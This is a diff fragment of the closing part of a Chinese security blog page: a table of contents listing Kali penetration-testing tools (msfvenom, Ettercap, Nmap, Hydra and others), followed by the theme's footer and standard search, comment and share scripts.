+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellter捆绑工具"><span class="nav-number">1.</span> <span class="nav-text">shellter捆绑工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfvenom-生成木马"><span class="nav-number">2.</span> <span class="nav-text">msfvenom 生成木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UPX-加壳工具"><span class="nav-number">3.</span> <span class="nav-text">UPX 加壳工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DHCPig-增强DHCP耗竭攻击"><span class="nav-number">4.</span> <span class="nav-text">DHCPig 增强DHCP耗竭攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ettercap"><span class="nav-number">5.</span> <span class="nav-text">Ettercap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#权限提升"><span class="nav-number">5.1.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP断网攻击"><span class="nav-number">5.2.</span> <span class="nav-text">ARP断网攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息嗅探"><span class="nav-number">5.3.</span> <span class="nav-text">信息嗅探</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片嗅探"><span class="nav-number">5.4.</span> <span class="nav-text">图片嗅探</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS劫持"><span class="nav-number">5.5.</span> <span class="nav-text">DNS劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap批量扫描"><span class="nav-number">6.</span> <span class="nav-text">Nmap批量扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS枚举工具"><span class="nav-number">7.</span> <span class="nav-text">DNS枚举工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNSenum"><span class="nav-number">7.1.</span> <span class="nav-text">DNSenum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fierce"><span class="nav-number">7.2.</span> <span class="nav-text">fierce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SNMP枚举工具（简单网络管理协议）"><span class="nav-number">8.</span> <span class="nav-text">SNMP枚举工具（简单网络管理协议）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#snmpwalk"><span class="nav-number">8.1.</span> <span class="nav-text">snmpwalk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smtp-user-enum"><span class="nav-number">8.2.</span> <span class="nav-text">smtp-user-enum</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域名查询工具"><span class="nav-number">9.</span> <span class="nav-text">域名查询工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DMitry"><span class="nav-number">9.1.</span> <span class="nav-text">DMitry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#netmask"><span class="nav-number">9.2.</span> <span class="nav-text">netmask</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跟踪路由工具"><span class="nav-number">10.</span> <span class="nav-text">跟踪路由工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#scapy"><span class="nav-number">10.1.</span> <span class="nav-text">scapy</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络映射器工具"><span class="nav-number">11.</span> <span class="nav-text">网络映射器工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">11.1.</span> <span class="nav-text">Nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP端口扫描工具"><span class="nav-number">12.</span> <span class="nav-text">TCP端口扫描工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-1"><span class="nav-number">12.1.</span> <span class="nav-text">Nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统指纹识别"><span class="nav-number">13.</span> <span class="nav-text">系统指纹识别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-2"><span class="nav-number">13.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指纹识别工具p0f"><span class="nav-number">13.2.</span> <span class="nav-text">指纹识别工具p0f</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#服务指纹识别"><span class="nav-number">14.</span> <span class="nav-text">服务指纹识别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-3"><span class="nav-number">14.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Amap"><span class="nav-number">14.2.</span> <span class="nav-text">Amap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码在线破解-暴力破解"><span class="nav-number">15.</span> <span class="nav-text">密码在线破解(暴力破解)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hydra"><span class="nav-number">15.1.</span> <span class="nav-text">Hydra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medusa"><span class="nav-number">15.2.</span> <span class="nav-text">Medusa</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析密码"><span class="nav-number">16.</span> <span class="nav-text">分析密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSFCONSOLE分析密码"><span class="nav-number">16.1.</span> <span class="nav-text">MSFCONSOLE分析密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#哈希识别工具"><span class="nav-number">16.2.</span> <span class="nav-text">哈希识别工具</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Intro</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("02/08/2018 19:14:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
